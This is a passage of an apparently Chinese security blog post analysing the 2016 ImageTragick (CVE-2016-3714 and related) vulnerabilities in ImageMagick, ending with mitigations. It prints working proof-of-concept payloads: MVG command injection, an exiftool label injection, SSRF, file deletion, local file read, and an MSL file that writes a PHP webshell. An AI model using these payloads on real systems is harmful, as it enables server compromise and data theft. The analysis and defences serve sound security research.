<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;ps&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;pdf&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;bi&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pdfwrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;ps&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;print&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;encode&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;lpr &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;ps:alpha&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pngalpha&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;ps:cmyk&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pam&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;ps:color&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pnmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;ps:mono&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pbmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;rgba&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;rle&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;encode&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;rawtorle&amp;quot; -o &amp;quot;%o&amp;quot; -v &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;scan&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;scanimage&amp;quot; -d &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;scanx&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;scanimage&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;miff&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;show&quot;</span> <span class="n">spawn</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;/usr/bin/display&amp;quot; -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;shtml&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;svg&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;rsvg-convert&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;txt&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;ps&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;bi&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;enscript&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;miff&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;win&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">spawn</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;/usr/bin/display&amp;quot; -immutable -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;wmf&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;wmf2eps&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;xps:color&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=ppmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;xps:cmyk&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=bmpsep8&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;xps:mono&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pbmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;/</span><span class="n">delegatemap</span><span class="o">&gt;</span> 
</pre></div>


<p>我们可以看到，这里它定义了很多占位符，比如%i是输入的文件名，%l是图片exif label信息。而在后面command的位置，%i和%l等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。</p>
<p>漏洞报告中给出的POC是利用了如下的这个委托：</p>
<div class="codehilite"><pre><span></span><span class="o">&lt;</span><span class="nt">delegate</span> <span class="nt">decode</span><span class="o">=</span><span class="s2">&quot;https&quot;</span> <span class="nt">command</span><span class="o">=</span><span class="s2">&quot;&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;&quot;</span><span class="o">/&gt;</span>
</pre></div>


<p>它在解析https图片的时候，使用了curl命令将其下载，我们看到%M被直接放在curl的最后一个参数内。ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。</p>
<p>所以我们可以构造一个.mvg格式的图片（但文件名可以不为.mvg，比如下图中包含payload的文件的文件名为vul.gif，而ImageMagick会根据其内容识别为mvg图片），并在https://后面闭合双引号，写入自己要执行的命令：</p>
<div class="codehilite"><pre><span></span><span class="nt">push</span> <span class="nt">graphic-context</span>
<span class="nt">viewbox</span> <span class="nt">0</span> <span class="nt">0</span> <span class="nt">640</span> <span class="nt">480</span>
<span class="nt">fill</span> <span class="s1">&#39;url(https://&quot;|id; &quot;)&#39;</span>
<span class="nt">pop</span> <span class="nt">graphic-context</span>
</pre></div>


<p>这样，ImageMagick在正常执行图片转换、处理的时候就会触发漏洞：</p>
<p>￼<a href="../content/uploadfile/201605/c2cd1462642728.jpg"><img alt="14624373793837.jpg" src="../content/uploadfile/201605/thum-c2cd1462642728.jpg" title="点击查看原图" /></a></p>
<p>其他几个CVE也比较有趣，比如CVE-2016-3718，他是利用mvg格式中可以包含url的特点，进行SSRF攻击，POC如下：</p>
<div class="codehilite"><pre><span></span>push graphic-context
viewbox 0 0 640 480
fill &#39;url(http://example.com/)&#39;
pop graphic-context
</pre></div>


<p>CVE-2016-3715是利用ImageMagick支持的ephemeral协议，来删除任意文件：</p>
<div class="codehilite"><pre><span></span>push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 &#39;ephemeral:/tmp/delete.txt&#39;
popgraphic-context
</pre></div>


<p>CVE-2016-3716是利用ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell。</p>
<p>特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作：</p>
<div class="codehilite"><pre><span></span>file_move.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 &#39;msl:/tmp/msl.txt&#39;
popgraphic-context

/tmp/msl.txt
-=-=-=-=-=-=-=-=-
<span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="nt">&lt;image&gt;</span>
<span class="nt">&lt;read</span> <span class="na">filename=</span><span class="s">&quot;/tmp/image.gif&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;write</span> <span class="na">filename=</span><span class="s">&quot;/var/www/shell.php&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/image&gt;</span>
</pre></div>


<p>CVE-2016-3717可以造成本地文件读取漏洞：</p>
<div class="codehilite"><pre><span></span>push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 &#39;label:@/etc/hosts&#39;
pop graphic-context
</pre></div>


<h2 id="_2"><a class="toclink" href="#_2">深入分析</a></h2>
<p>除了报告中给出的POC以外，各个安全研究人员也集思广益，发现这个洞的更多利用/影响方式。</p>
<p>首先，PHP扩展『ImageMagick』也存在这个问题，而且只需要调用了Imagick类的构造方法，即可触发这个漏洞：</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">new</span> <span class="nx">Imagick</span><span class="p">(</span><span class="s1">&#39;vul.gif&#39;</span><span class="p">);</span>
</pre></div>


<p>因为没有返回值，我利用cloudeye捕捉到apache日志，从日志中读取命令执行的结果：</p>
<p><a href="../content/uploadfile/201605/3c591462642729.png"><img alt="QQ20160504-5@2x.png" src="../content/uploadfile/201605/thum-3c591462642729.png" title="点击查看原图" /></a>￼</p>
<p>另外，经过分析，研究人员发现除了.mvg格式的图片以外，普通png格式的图片也能触发命令执行漏洞。我们看到前面委托中对%l，也就是exif label的处理：</p>
<div class="codehilite"><pre><span></span><span class="o">&lt;</span><span class="nt">delegate</span> <span class="nt">decode</span><span class="o">=</span><span class="s2">&quot;miff&quot;</span> <span class="nt">encode</span><span class="o">=</span><span class="s2">&quot;show&quot;</span> <span class="nt">spawn</span><span class="o">=</span><span class="s2">&quot;True&quot;</span> <span class="nt">command</span><span class="o">=</span><span class="s2">&quot;&amp;quot;/usr/bin/display&amp;quot; -delay 0 -window-group %</span><span class="cp">[</span><span class="k">group</span><span class="cp">]</span><span class="s2"> -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
</pre></div>


<p>它将%l拼接进入了/usr/bin/display命令中，所以我只需将正常的png图片，带上一个『恶意』的exif信息。在调用ImageMagick将其处理成.show文件的时候，即可触发命令注入漏洞：</p>
<div class="codehilite"><pre><span></span>exiftool -label=&quot;\&quot;|/usr/bin/id; \&quot;&quot; test.png
convert test.png o.show
</pre></div>


<p><a href="../content/uploadfile/201605/7bfe1462642728.jpg"><img alt="14624399792594.jpg" src="../content/uploadfile/201605/thum-7bfe1462642728.jpg" title="点击查看原图" /></a></p>
<p>但这个方法鸡肋之处在于，因为delegate.xml中配置的encode=show（或win），所以只有输出为.show或.win格式的情况下才会调用这个委托，而普通的文件处理是不会触发这个命令的。</p>
<h2 id="_3"><a class="toclink" href="#_3">影响分析</a></h2>
<p>ImageMagick是一个使用非常广的组件，大量厂商都在处理图片的时候调用这个程序进行处理，而且很多开源应用也在核心代码中包含了ImageMagick选项。</p>
<p>Wordpress是著名的个人博客/CMS厂商，其核心源码中使用了PHP扩展ImageMagick。受到这个漏洞的影响，在攻击者拥有一定权限的情况下，可以在Wordpress中触发任意命令执行漏洞： <a href="http://www.wooyun.org/bugs/wooyun-2010-0205047"><a href="http://www.wooyun.org/bugs/wooyun-2010-0205047">http://www.wooyun.org/bugs/wooyun-2010-0205047</a></a></p>
<p>同样的，Discuz、Drupal等常用CMS中也调用了ImageMagick扩展或ImageMagick库，CVE-2016-3714也可能会影响到他们。</p>
<p>但根据我对Discuz的分析，其调用ImageMagick处理图片之前，会先使用php的getimagesize进行图片格式、大小的验证，所以本文中所涉及的POC无法在Disucz中直接使用，但不排除有其他方法绕过discuz对该问题的限制。</p>
<p>除了开源软件中的漏洞以外，国内外各大厂商或多或少都收到了该问题的影响，影响最大的应该属人人，人人某处上传位置调用了ImageMagick进行图片的处理，结果造成了命令执行，导致内网被白帽子攻破： <a href="http://www.wooyun.org/bugs/wooyun-2016-0205171"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205171">http://www.wooyun.org/bugs/wooyun-2016-0205171</a></a></p>
<p>另外，百度、新浪、腾讯、360等诸多厂商都收到该漏洞影响： <a href="http://www.wooyun.org/bugs/wooyun-2016-0205381"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205381">http://www.wooyun.org/bugs/wooyun-2016-0205381</a></a> 、 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205375"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205375">http://www.wooyun.org/bugs/wooyun-2016-0205375</a></a> 、 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205290"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205290">http://www.wooyun.org/bugs/wooyun-2016-0205290</a></a> 、 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205259"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205259">http://www.wooyun.org/bugs/wooyun-2016-0205259</a></a> 、 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205206"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205206">http://www.wooyun.org/bugs/wooyun-2016-0205206</a></a> 、 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205343"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205343">http://www.wooyun.org/bugs/wooyun-2016-0205343</a></a></p>
<p>还有个比较有意思的地方，因为新浪sae的php包含ImageMagick扩展，所以乌云上有白帽子利用这个漏洞，成功绕过了sae的沙盒 <a href="http://www.wooyun.org/bugs/wooyun-2016-0205051"><a href="http://www.wooyun.org/bugs/wooyun-2016-0205051">http://www.wooyun.org/bugs/wooyun-2016-0205051</a></a></p>
<h2 id="_4"><a class="toclink" href="#_4">漏洞修复</a></h2>
<p>关于这个漏洞影响ImageMagick 6.9.3-9以前是所有版本，包括ubuntu源中安装的ImageMagick。而官方在6.9.3-9版本中对漏洞进行了不完全的修复。所以，我们不能仅通过更新ImageMagick的版本来杜绝这个漏洞。</p>
<p>现在，我们可以通过如下两个方法来暂时规避漏洞：</p>
<ol>
<li>处理图片前，先检查图片的 magic bytes，也就是图片头，如果图片头不是你想要的格式，那么就不调用ImageMagick处理图片。如果你是php用户，可以使用getimagesize函数来检查图片格式，而如果你是wordpress等web应用的使用者，可以暂时卸载ImageMagick，使用php自带的gd库来处理图片。</li>
<li>使用policy file来防御这个漏洞，这个文件默认位置在 /etc/ImageMagick/policy.xml ，我们通过配置如下的xml来禁止解析https等敏感操作：</li>
</ol>
<div class="codehilite"><pre><span></span><span class="nt">&lt;policymap&gt;</span>
<span class="nt">&lt;policy</span> <span class="na">domain=</span><span class="s">&quot;coder&quot;</span> <span class="na">rights=</span><span class="s">&quot;none&quot;</span> <span class="na">pattern=</span><span class="s">&quot;EPHEMERAL&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;policy</span> <span class="na">domain=</span><span class="s">&quot;coder&quot;</span> <span class="na">rights=</span><span class="s">&quot;none&quot;</span> <span class="na">pattern=</span><span class="s">&quot;URL&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;policy</span> <span class="na">domain=</span><span class="s">&quot;coder&quot;</span> <span class="na">rights=</span><span class="s">&quot;none&quot;</span> <span class="na">pattern=</span><span class="s">&quot;HTTPS&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;policy</span> <span class="na">domain=</span><span class="s">&quot;coder&quot;</span> <span class="na">rights=</span><span class="s">&quot;none&quot;</span> <span class="na">pattern=</span><span class="s">&quot;MVG&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;policy</span> <span class="na">domain=</span><span class="s">&quot;coder&quot;</span> <span class="na">rights=</span><span class="s">&quot;none&quot;</span> <span class="na">pattern=</span><span class="s">&quot;MSL&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/policymap&gt;</span> 
</pre></div>


<p>参考文献：<br />
<a href="https://imagetragick.com/"><a href="https://imagetragick.com/">https://imagetragick.com/</a></a><br />
<a href="http://www.openwall.com/lists/oss-security/2016/05/03/18"><a href="http://www.openwall.com/lists/oss-security/2016/05/03/18">http://www.openwall.com/lists/oss-security/2016/05/03/18</a></a><br />
<a href="http://weibo.com/p/1001603971443670055277"><a href="http://weibo.com/p/1001603971443670055277">http://weibo.com/p/1001603971443670055277</a></a></p>
<p>并感谢 @redrain有节操 @Ricter @BigBan 的帮助</p>
            </div>
            <div itemprop="keywords" class="tags-meta">
                标签:
                
                    <a href="../tag/ImageMagick.html">ImageMagick</a>
                
                    <a href="../tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">命令执行漏洞</a>
                
            </div>
            <br>
<!--MOB SHARE BEGIN-->
<div class="-mob-share-ui-button -mob-share-open">分享</div>
<div class="-mob-share-ui" style="display: none">
    <ul class="-mob-share-list">
        <li class="-mob-share-weibo"><p>新浪微博</p></li>
        <li class="-mob-share-qzone"><p>QQ空间</p></li>
        <li class="-mob-share-qq"><p>QQ好友</p></li>
        <li class="-mob-share-weixin"><p>微信</p></li>
        <li class="-mob-share-douban"><p>豆瓣</p></li>
        <li class="-mob-share-facebook"><p>Facebook</p></li>
        <li class="-mob-share-twitter"><p>Twitter</p></li>
        <li class="-mob-share-pocket"><p>Pocket</p></li>
        <li class="-mob-share-google"><p>Google+</p></li>
        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
        <li class="-mob-share-mingdao"><p>明道</p></li>
        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
    </ul>
    <div class="-mob-share-close">取消</div>
</div>
<div class="-mob-share-ui-bg"></div>
<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
<!--MOB SHARE END-->

        <div class="qqlist">
          <h3>订阅本站<small>(RSS)</small></h3>
          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
          <input type="hidden" value="qf_booked_feedback" name="t" />
          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
          <button type="submit" >订阅&rarr;</button>
          </form>
        </div>


        </div>

        
        <div class="post-single type-post text-center">
            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
            <img src="../static/wx.jpg" width="280" alt="">
        </div>
        

        <!-- 评论位置 -->
        <div id="comments" class="comments">
          <h3>已有 6 条评论</h3>
            <ol class="comment-list">
            
            
              <li class="comment-body" id="comment-3455">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/abab95a53878165737bf852607fc6fd1.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">Windy</a></div>
                    <p>Hi, i think that i saw you visited my website thus i came to “return the favor”.I&#x27;m trying to find things to enhance my site!I suppose its ok to use a few of your ideas!!</p>
                    <span class="comment-time">时间: 2019-12-12 06:14</span>
                    <span class="comment-reply"><a href="#comment-3455" onclick="reply_to('3455','Windy')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3169">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">z</a></div>
                    <p>哈</p>
                    <span class="comment-time">时间: 2018-10-18 16:06</span>
                    <span class="comment-reply"><a href="#comment-3169" onclick="reply_to('3169','z')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2434">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/f109bc39723cc594eb2c25d4fa339240.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://www.leavesongs.com" target="_blank" rel="nofollow noopener">小白</a></div>
                    <p>玩这些什么jsp,asp是不是都要学下</p>
                    <span class="comment-time">时间: 2016-09-05 21:27</span>
                    <span class="comment-reply"><a href="#comment-2434" onclick="reply_to('2434','小白')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2330">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/670ff61c094067e3944447c0fce3147a.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">test</a></div>
                    <p>getimagesize是不可靠的,<br>http://0x1.im/blog/php/php-function-getimagesize.html</p>
                    <span class="comment-time">时间: 2016-05-25 10:12</span>
                    <span class="comment-reply"><a href="#comment-2330" onclick="reply_to('2330','test')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2331">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
                    <p>@test：『不是完全可靠』和『完全不可靠』可不一样哦。比如这篇文章说的图片内容，getimagesize你就绕不过，不服请给实例。</p>
                    <span class="comment-time">时间: 2016-05-25 12:18</span>
                    <span class="comment-reply"><a href="#comment-2331" onclick="reply_to('2331','phithon')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2339">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/670ff61c094067e3944447c0fce3147a.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">test</a></div>
                    <p>@phithon：好吧. <br>我经历过人生第一次所谓的离别，便再也不作诗，再也不作文。<br>这句话不错。<br>作为我的个性签名了<br>哈哈</p>
                    <span class="comment-time">时间: 2016-05-27 09:46</span>
                    <span class="comment-reply"><a href="#comment-2339" onclick="reply_to('2339','test')">回复</a></span>
                    </div>
                </div>
              </li>
            
            
            </ol>
            
        </div>

        <div id="reply"></div>
        <div id="comment-place">
            <div id="comment-post" class="respond none-resize">
             <div id="respond">
                <h3 id="response">添加新评论</h3>
                <form method="post" id="comment-form" role="form" action="#comments">
                    <p>
                        <label for="author" class="required">称呼</label>
                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
                    </p>
                    <p>
                        <label for="mail">Email</label>
                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
                    </p>
                    <p>
                        <label for="url">网站</label>
                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
                    </p>
                    <p>
                        <label for="textarea" class="required">内容</label>
                        <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
                    </p>
                    <p>
                        <label style="float:left;">验证码</label>
                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="7d7e230d5e1fcbef8bcdc82d60c087ebc655205d" />
</div><div class="col-6">
<img src="../captcha/image/7d7e230d5e1fcbef8bcdc82d60c087ebc655205d/index.png" alt="captcha" class="captcha" /></div></div>
                    </p>
                    <p>
                        <button type="submit" class="submit">提交评论</button>
                        <input type="hidden" name="parent" id="id_parent">
                        <input type="hidden" name="archive" value="386" id="id_archive">
                        <input type="hidden" name="csrfmiddlewaretoken" value="h4RFipXUNyIK0gS63iMhdPxsK8whpoTt3CfwQuyDbUWtyOGu5jJ2aiAx5vNsY05L">
                    </p>
                </form>
                </div>
            </div>
        </div>

    </div>
    



<div  class="col-5 columns" id="sidebar" role="complementary">

  <div class="widget widget_search">
    <h3>搜索</h3>
    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
        <button type="submit"  id="searchsubmit">Go</button>
    </form>
  </div>

  
  <div class="widget">
	<h3 class="widget-title">最新评论</h3>
	<ul class="widget-list" id="recent-comment">
    
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
